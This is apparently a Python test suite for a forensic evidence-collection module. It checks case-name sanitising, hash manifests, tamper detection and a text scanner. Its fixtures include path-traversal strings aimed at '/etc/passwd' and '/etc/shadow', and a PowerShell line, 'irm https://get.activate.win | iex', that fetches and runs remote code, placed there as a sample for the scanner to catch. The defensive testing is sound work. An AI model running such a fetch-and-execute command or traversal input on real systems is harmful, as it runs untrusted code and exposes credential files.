import os
import tempfile
import unittest
from unittest import mock

from jarvis.response.evidence import case as case_mod
from jarvis.response.evidence import paths, sources
from jarvis.response.evidence.manifest import Manifest, sha256_file
from jarvis.response.evidence.scan import scan_text


class _CaseTestBase(unittest.TestCase):
    """Each test gets its own evidence root; none touch the real one."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.root = os.path.join(self._tmp.name, "evidence")
        # Case directories are resolved through paths.EVIDENCE_ROOT at call
        # time, so redirecting it keeps the real evidence root untouched.
        patch = mock.patch.object(paths, "EVIDENCE_ROOT", self.root)
        patch.start()
        self.addCleanup(patch.stop)

    def _file(self, name, data=b"payload"):
        path = os.path.join(self._tmp.name, name)
        with open(path, "wb") as fh:
            fh.write(data)
        return path


class CaseNamingTests(unittest.TestCase):
    def test_case_name_cannot_escape_the_evidence_root(self):
        for hostile in ("../../etc/passwd", "/etc/shadow", "..", "....//",
                        "a/b/c"):
            name = paths.safe_name(hostile)
            self.assertNotIn("/", name)
            self.assertFalse(name.startswith("."), name)

    def test_empty_or_punctuation_name_still_yields_a_directory(self):
        self.assertTrue(paths.safe_name(""))
        self.assertTrue(paths.safe_name("..."))


class ManifestTests(_CaseTestBase):
    def test_collected_file_is_recorded_with_its_real_hash(self):
        src = self._file("evidence.bin", b"abc123")
        c = case_mod.Case("case-a")
        res = c.add_file(src)

        self.assertTrue(res["ok"])
        self.assertEqual(res["sha256"], sha256_file(src))
        self.assertEqual(c.files()[res["name"]]["size"], 6)

    def test_verify_reports_tampering_rather_than_raising(self):
        c = case_mod.Case("case-b")
        name = c.add_file(self._file("log.txt", b"original"))["name"]
        with open(c.path(name), "wb") as fh:
            fh.write(b"tampered")

        ok, changed, missing = c.verify()

        self.assertEqual(changed, [name])
        self.assertEqual((ok, missing), ([], []))

    def test_verify_reports_a_deleted_artefact_as_missing(self):
        c = case_mod.Case("case-c")
        name = c.add_file(self._file("gone.txt"))["name"]
        os.unlink(c.path(name))

        ok, changed, missing = c.verify()

        self.assertEqual(missing, [name])

    def test_recollecting_changed_bytes_is_flagged_not_silently_replaced(self):
        src = self._file("live.log", b"first")
        c = case_mod.Case("case-d")
        first = c.add_file(src, name="live.log")
        with open(src, "wb") as fh:
            fh.write(b"second")
        second = c.add_file(src, name="live.log")

        self.assertFalse(first["changed"])
        self.assertTrue(second["changed"])
        self.assertNotEqual(first["sha256"], second["sha256"])

    def test_sums_file_is_readable_by_coreutils_alone(self):
        c = case_mod.Case("case-e")
        res = c.add_file(self._file("a.bin", b"xyz"))
        with open(os.path.join(c.dir, "SHA256SUMS.txt")) as fh:
            text = fh.read()

        self.assertEqual(text, "%s  %s\n" % (res["sha256"], res["name"]))

    def test_unreadable_source_is_reported_not_raised(self):
        c = case_mod.Case("case-f")
        res = c.add_file("/nonexistent/definitely/not/here.evtx")

        self.assertFalse(res["ok"])
        self.assertIn("not present", res["error"])
        self.assertEqual(c.files(), {})

    def test_manifest_survives_being_reopened(self):
        c = case_mod.Case("case-g")
        res = c.add_file(self._file("keep.bin", b"kept"))
        again = Manifest(c.dir)

        self.assertEqual(again.get(res["name"])["sha256"], res["sha256"])


class AdoptTests(_CaseTestBase):
    def test_adopt_indexes_files_already_present_without_recollecting(self):
        c = case_mod.Case("adopted")
        with open(os.path.join(c.dir, "prior.evtx"), "wb") as fh:
            fh.write(b"earlier snapshot")

        _, added = case_mod.adopt("adopted")

        self.assertEqual(added, ["prior.evtx"])
        self.assertEqual(case_mod.Case("adopted").files()["prior.evtx"]["source"],
                         "adopted")

    def test_adopt_is_idempotent_and_skips_its_own_bookkeeping(self):
        c = case_mod.Case("adopted2")
        c.add_file(self._file("x.bin", b"x"))
        case_mod.adopt("adopted2")
        _, second = case_mod.adopt("adopted2")

        self.assertEqual(second, [])
        self.assertNotIn("SHA256SUMS.txt", case_mod.Case("adopted2").files())


class SourceResolutionTests(unittest.TestCase):
    def test_windows_paths_map_onto_the_wsl_mount(self):
        self.assertEqual(sources.to_wsl(r"C:\Users\x\a.txt"), "/mnt/c/Users/x/a.txt")
        self.assertEqual(sources.to_wsl("/already/posix"), "/already/posix")

    def test_missing_file_is_diagnosed_as_absent_not_as_permissions(self):
        self.assertEqual(sources.diagnose("/nonexistent/path/x"), "not present")

    def test_readable_file_resolves_directly_without_scanning_namespaces(self):
        with tempfile.NamedTemporaryFile() as fh:
            fh.write(b"data")
            fh.flush()
            path, how = sources.resolve(fh.name)
        self.assertEqual(how, "direct")
        self.assertEqual(path, fh.name)


class ScanTests(_CaseTestBase):
    def test_text_scan_reports_line_numbers_and_which_needle_hit(self):
        path = self._file("history.txt",
                          b"benign\nirm https://get.activate.win | iex\n")
        out = scan_text(path, ["get.activate.win"])

        self.assertEqual(out["lines"], 2)
        self.assertEqual(out["matches"][0]["line"], 2)
        self.assertEqual(out["matches"][0]["hits"], ["get.activate.win"])

    def test_scan_is_case_insensitive_so_logged_casing_cannot_evade_it(self):
        path = self._file("h.txt", b"IRM HTTPS://GET.ACTIVATE.WIN | IEX\n")
        self.assertTrue(scan_text(path, ["get.activate.win"])["matches"])


if __name__ == "__main__":
    unittest.main()
